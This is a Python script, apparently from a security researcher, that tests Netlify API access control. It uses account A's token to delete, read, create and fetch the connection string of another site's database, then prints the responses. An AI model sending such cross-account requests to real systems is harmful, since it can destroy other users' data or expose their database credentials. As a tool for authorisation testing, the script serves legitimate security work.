# -*- coding: utf-8 -*-
"""Netlify:跨账号 DELETE database 400 语义 + database 相关 API 权限矩阵
A token 操作 B 的资源:list/get/delete database
"""
import http.client, ssl, gzip, brotli, sys, json
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, TOKEN_A

ctx = ssl.create_default_context()
SITE_B = 'd2977de0-d24d-4544-81cb-933e610cad7d'

def api(path, method='GET', body=None, cookie=None, token=None, host='api.netlify.com'):
    conn = http.client.HTTPSConnection(host, context=ctx, timeout=40)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept-Encoding': 'br, gzip', 'Content-Type': 'application/json'}
    if token:
        h['Authorization'] = 'Bearer ' + token
    if cookie:
        h['Cookie'] = cookie
    payload = json.dumps(body).encode() if body is not None else None
    conn.request(method, path, body=payload, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    ct = r.getheader('Content-Type', '')
    conn.close()
    return st, raw, ct

tests = [
    ('A DELETE B db      ', '/api/v1/sites/%s/database' % SITE_B, 'DELETE', None),
    ('A GET  B db        ', '/api/v1/sites/%s/database' % SITE_B, 'GET', None),
    ('A GET  B db/connstr', '/api/v1/sites/%s/database/connection-string' % SITE_B, 'GET', None),
    ('A POST B db        ', '/api/v1/sites/%s/database' % SITE_B, 'POST', {}),
    ('A GET  B site      ', '/api/v1/sites/%s' % SITE_B, 'GET', None),
    ('A GET  A db        ', '/api/v1/sites/04f08ff6-f274-47ac-b6d7-5fb1e055f3b4/database', 'GET', None),
]
for label, p, m, body in tests:
    st, raw, ct = api(p, m, body, token=TOKEN_A)
    txt = raw.decode('utf-8', 'ignore').replace('\n', ' ')[:160]
    print('%-22s %d  %s' % (label, st, txt))
